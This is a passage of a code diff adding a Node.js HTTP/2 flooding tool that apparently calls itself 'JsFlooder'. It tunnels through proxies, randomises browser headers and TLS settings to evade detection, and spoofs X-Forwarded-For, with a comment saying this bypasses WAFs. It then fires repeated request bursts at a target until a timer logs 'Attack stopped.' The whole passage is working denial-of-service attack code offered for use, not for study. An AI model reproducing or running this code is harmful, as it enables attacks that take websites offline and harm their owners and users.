+    const secChUaPlatformVersion = platformVersion ? `"${platformVersion}"` : '';
+
+    // Return object với các headers
+    return {
+        'sec-ch-ua': secChUa,
+        'sec-ch-ua-platform': secChUaPlatform,
+        'sec-ch-ua-mobile': secChUaMobile,
+        'sec-ch-ua-platform-version': secChUaPlatformVersion, // Optional, chỉ nếu có version
+        'sec-ch-ua-full-version-list': secChUaFullVersionList
+    };
+}
+
+// Danh sách ngôn ngữ accept-language phổ biến
+const acceptLanguages = [
+    'en-US,en;q=0.9',
+    'en-GB,en;q=0.8',
+    'fr-FR,fr;q=0.9,en;q=0.8',
+    'de-DE,de;q=0.9,en;q=0.8',
+    'es-ES,es;q=0.9',
+    'it-IT,it;q=0.9',
+    'pt-BR,pt;q=0.9',
+    'zh-CN,zh;q=0.9',
+    'ja-JP,ja;q=0.9',
+    'ko-KR,ko;q=0.9'
+];
+
+// Danh sách accept-encoding phổ biến
+const acceptEncodings = [
+    'gzip, deflate, br, zstd',
+    'gzip, deflate, br',
+    'gzip, deflate',
+    'br, gzip, deflate'
+];
+
+// Danh sách accept headers cho document
+const acceptHeaders = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+];
+
+function flood(proxy) {
+	let parsed = url.parse(target);
+	let sigals = headerFunc.sigalgs();
+
+  let interval
+if (input === 'flood') {
+	interval = 1000;
+  } else if (input === 'bypass') {
+	function randomDelay(min, max) {
+	  return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+
+	interval = randomDelay(100, 1000);
+  } else {
+	interval = 1000;
+  }
+function generateRandomString(minLength, maxLength) {
+					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
+  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+  const randomStringArray = Array.from({ length }, () => {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    return characters[randomIndex];
+  });
+
+  return randomStringArray.join('');
+}
+function getRandomFileExtension() {
+    const extensions = ['.php', '.js', '.css', '.html', '.json', '.xml'];
+    return extensions[Math.floor(Math.random() * extensions.length)];
+}
+
+ const nodeii = getRandomInt(134, 135);
+
+ // Phân tích useragent để lấy các headers động
+ const uaHeaders = parseUserAgent(useragent);
+
+    const header = {
+        ...method,
+        ":authority": parsed.host,
+        ":scheme": 'https',
+        "Referer" : randomEngine,
+        ":path" : path,
+        //":path": path + "/" + generateRandomString(10,15) + ".php?s=" + generateRandomString(10,15) + "&" + generateRandomString(10,15),
+       // ":path": path + "/" + generateRandomString(10,15) + getRandomFileExtension() + "?s=" + generateRandomString(10,15) + "&" + generateRandomString(10,15),
+        "upgrade-insecure-requests": "1",
+        'user-agent': useragent,
+    };
+    let dynHeaders = {
+    "upgrade-insecure-requests": "1",
+  "sec-fetch-mode": "navigate",
+  "sec-fetch-dest": "document",
+  "Authorization": cookie,
+  "cookie": cookie,
+  "sec-ch-ua": uaHeaders['sec-ch-ua'],
+  "sec-ch-ua-platform": uaHeaders['sec-ch-ua-platform'],
+  "sec-ch-ua-mobile": uaHeaders['sec-ch-ua-mobile'],
+  ...(uaHeaders['sec-ch-ua-platform-version'] ? { 'sec-ch-ua-platform-version': uaHeaders['sec-ch-ua-platform-version'] } : {}),
+  "sec-ch-ua-full-version-list": uaHeaders['sec-ch-ua-full-version-list'],
+  "sec-fetch-user": "?1",
+  "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
+  ...(Math.random() < 0.8 ? { "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)] } : {}),
+  "accept": acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
+  "upgrade-insecure-requests": "1",
+  "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
+      ...(Math.random() < 0.3 ? { "x-forwarded-for": randomIp() } : {}), // Thêm X-Forwarded-For random để bypass một số WAF
+    "cache-control": controle_header[Math.floor(Math.random() * controle_header.length)],
+  "pragma": "no-cache",
+
+}
+
+    if (Math.random() >= 0.5) {
+        dynHeaders = {
+            ...dynHeaders,
+   ...(Math.random() < 0.5 ?{["origin"]: parsed.origin} : {}), // Thêm Origin nếu là POST để mimic browser
+          ...(Math.random() < 0.3  ?{"x-client-data": generateRandomString(20, 30)}:{}), // Header Chrome-specific
+          ...(Math.random() < 0.4  ?{['sec-ch-prefers-color-scheme']: Math.random() < 0.5 ? 'light' : 'dark'} : {}),
+          ...(Math.random() < 0.2  ?{['sec-ch-viewport-width']: getRandomInt(360, 1080).toString()} : {}),
+
+        };
+    }
+let dynHeadersd = {
+    "upgrade-insecure-requests": "1",
+  "sec-fetch-mode": "navigate",
+  "sec-fetch-dest": "document",
+  "Authorization": cookie,
+  "cookie": cookie,
+  "sec-ch-ua": uaHeaders['sec-ch-ua'],
+  "sec-ch-ua-platform": uaHeaders['sec-ch-ua-platform'],
+  "sec-ch-ua-mobile": uaHeaders['sec-ch-ua-mobile'],
+  ...(uaHeaders['sec-ch-ua-platform-version'] ? { 'sec-ch-ua-platform-version': uaHeaders['sec-ch-ua-platform-version'] } : {}),
+  "sec-ch-ua-full-version-list": uaHeaders['sec-ch-ua-full-version-list'],
+  "sec-fetch-user": "?1",
+  "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
+   "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
+  ...(Math.random() < 0.3 ? {'Clear-Site-Data': "cache"}:{}),
+"priority": "u=0, i",
+"Refresh": "36600, url="+ parsed.href,
+'Set-Login': Math.random < 0.5 ? "logged-in" : "logged-out",
+...(Math.random < 0.5 ? {"Origin-Agent-Cluster": '?1'}:{}),
+"cache-control": controle_header[Math.floor(Math.random() * controle_header.length)],
+"pragma": "no-cache",
+  ...(Math.random() < 0.8 ? { "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)] } : {}),
+  "accept": acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
+}
+
+    if (Math.random() >= 0.5) {
+        dynHeadersd = {
+            ...dynHeadersd,
+            ...(Math.random() < 0.3 ? { "x-forwarded-for": randomIp() } : {}),
+   ...(Math.random() < 0.4 ?{"sec-ch-prefers-reduced-motion": "no-preference"}:{}),
+          ...(Math.random() < 0.3 ?{ "sec-ch-ua-arch": "\"arm\"" }:{}),
+         ...(Math.random() < 0.2 ?{ "sec-ch-ua-bitness": "\"64\"" }:{}),
+          ...(Math.random() < 0.4 ?{["x-client-data"]: generateRandomString(20, 30)}:{}),
+
+        };
+
+    }
+
+    let head 
+    
+    if (Math.random() >= 0.5) {
+    head ={
+        ...header,
+					...dynHeaders,
+         }
+         }else {head ={
+        ...header,
+					...dynHeadersd,
+         }
+         }
+         const sendRequest = async (client, retries = 3) => {
+            try {
+                const request = client.request(head, {
+                    endStream: false,
+                    weight: 256,
+                    depends_on: 0,
+                    exclusive: false,
+                });
+
+                if (debug === 'true') {
+                    request.on('response', (res) => {
+                        console.log(res[':status']);
+                    });
+                }
+
+                request.end();
+                
+                // ??i cho ??n khi request ho��n t?t
+                await new Promise((resolve, reject) => {
+                    request.on('end', resolve);
+                    request.on('error', reject);
+                });
+
+            } catch (error) {
+                console.error('Request failed:', error);
+
+                if (retries > 0) {
+                    console.log('Retrying request...');
+                    await sendRequest(client,retries - 1);
+                } else {
+                    console.error('Max retries reached. Request failed.');
+                }
+            }
+        };
+         //
+         //console.log(head)
+	 const regexPattern =  /^([\w.-]+):(\w+)@([\w.-]+):(\d+)$/;
+ const match = proxy.match(regexPattern);
+if (match) {
+	const agent = new http.Agent({
+		host: match[3]
+		, port: match[4]
+		, keepAlive: true
+		, keepAliveMsecs: 500000000
+		, maxSockets: 50000
+		, maxTotalSockets: 100000
+	, });
+	const Optionsreq = {
+		agent: agent
+		, method: 'CONNECT'
+		, path: parsed.host + ':443'
+		, timeout: 1000
+		, headers: {
+			'Host': parsed.host
+			, 'Proxy-Connection': 'Keep-Alive'
+			, 'Connection': 'Keep-Alive'
+      ,'Proxy-Authorization': 'Basic ' + Buffer.from(`${match[1]}:${match[2]}`).toString('base64')
+		, }
+	, };
+	connection = http.request(Optionsreq, (res) => {});
+ } else {
+	proxy = process.argv[5].split(":");
+ const agent = new http.Agent({
+		host: proxy[0]
+		, port: proxy[1]
+		, keepAlive: true
+		, keepAliveMsecs: 500000000
+		, maxSockets: 50000
+		, maxTotalSockets: 100000
+	, });
+	const Optionsreq = {
+		agent: agent
+		, method: 'CONNECT'
+		, path: parsed.host + ':443'
+		, headers: {
+			'Host': parsed.host
+			, 'Proxy-Connection': 'Keep-Alive'
+			, 'Connection': 'Keep-Alive'
+		, }
+	, };
+	connection = http.request(Optionsreq, (res) => {});
+ }
+ const TLSOPTION = {
+    ciphers: cplist.join(':'),
+    secureProtocol: ["TLSv1_3_method"],
+    sigalgs: Math.random() < 0.5 ? sigals : concu,
+    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom| crypto.constants.SSLcom,
+    echdCurve: Math.random() < 0.5 ? "X25519:secp256r1:secp512r1:secp384r1" : "X25519",
+    secure: true,
+    rejectUnauthorized: false,
+    ALPNProtocols: Math.random() < 0.5 ?['h2']:['h2','http1/1'],
+  };
+
+	function createCustomTLSSocket(parsed, socket) {
+		const tlsSocket = tls.connect({
+			...TLSOPTION
+			, host: parsed.host
+			, port: 443
+			, servername: parsed.host
+			, socket: socket
+		});
+		//console.log('succes connect ')
+		tlsSocket.setKeepAlive(true, 600000 * 1000);
+		  
+		return tlsSocket;
+	}
+	connection.on('connect', async function(res, socket) {
+		
+    socket.setKeepAlive(true, 100000);
+		const tlsSocket = createCustomTLSSocket(parsed, socket)	
+
+const client = http2.connect(parsed.href, {
+	createConnection: () => tlsSocket,
+      settings: {
+       
+		headerTableSize: 65536,
+		enablePush: true,
+		initialWindowSize:6291456,
+		...(Math.random() >= 0.5 ? {maxHeaderListSize: 262144}:{}),
+		...(Math.random() >= 0.5 ? {maxFrameSize: 16777215}:{}),
+		enableConnectProtocol: true
+      },
+	}, (session) => {
+    session.setLocalWindowSize(15663105 + 65535);
+});
+
+		client.on("connect", () => {
+    clearr = setInterval(async () => {
+        for (let i = 0; i < rps; i++) {
+            sendRequest(client); 
+        }
+    }, interval);
+});
+
+		client.on("close", () => {
+			client.destroy();
+			tlsSocket.destroy();
+			socket.destroy();
+			return
+		});
+
+client.on("error", error => {
+    client.destroy();
+			tlsSocket.destroy();
+			socket.destroy();
+			return
+});
+
+	});
+
+	connection.on('error', (error) => {
+		connection.destroy();
+		if (error) return;
+	});
+	connection.on('timeout', () => {
+		connection.destroy();
+		return
+	});
+	connection.end();
+}//
+let intervalId;
+let  intervalId2;
+const valid = () => setInterval(function() {
+    flood(proxyr);
+}, 10);
+
+intervalId = valid();
+ intervalId2 = valid();
+setInterval(() => {
+    clearInterval(intervalId);
+    clearInterval(intervalId2);
+    intervalId = valid();
+    intervalId2 = valid();
+}, 10000);
+const {
+    spawn
+} = require('child_process');
+const { ref } = require('process');
+
+const MAX_RAM_PERCENTAGE = 40;
+
+function Seconds() {
+    const currentTime = Date.now();
+    const elapsedTimeInSeconds = Math.floor((currentTime - startTime) / 1000);
+    const remainingSeconds = Math.max(time - elapsedTimeInSeconds, 0);
+    return remainingSeconds;
+}
+
+const startTime = Date.now();
+
+const restartScript = (timereset) => {
+    //console.log('[>] Restarting...');
+    process.argv[3] = timereset
+    //console.log(timereset)
+    const child = spawn(process.argv[0], process.argv.slice(1), {
+        detached: true,
+        stdio: 'ignore'
+    });
+    child.unref();
+    process.exit();
+};
+
+const handleRAMUsage = () => {
+    const totalRAM = os.totalmem();
+    const usedRAM = totalRAM - os.freemem();
+    const ramPercentage = (usedRAM / totalRAM) * 100;
+    const endtime = Seconds()
+    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
+        // console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
+        restartScript(endtime);
+    }
+};
+
+const Script = () => {
+    const child = spawn('pkill', ['-f', validkey]);
+    child.on('close', (code, signal) => {
+        console.log(`Child process terminated with code ${code} and signal ${signal}`);
+        process.exit();
+    });
+};
+
+process.on('SIGINT', () => {
+    console.log('Received SIGINT. Exiting...');
+    Script();
+    process.exit(0);
+});
+
+setInterval(handleRAMUsage, 1000);
+console.log(`JsFlooder Started with proxies: ${proxyFile}`);
+
+setTimeout(function() {
+    console.log("Attack stopped.");
+    Script();
+    process.exit(1);
+}, time * 1000);
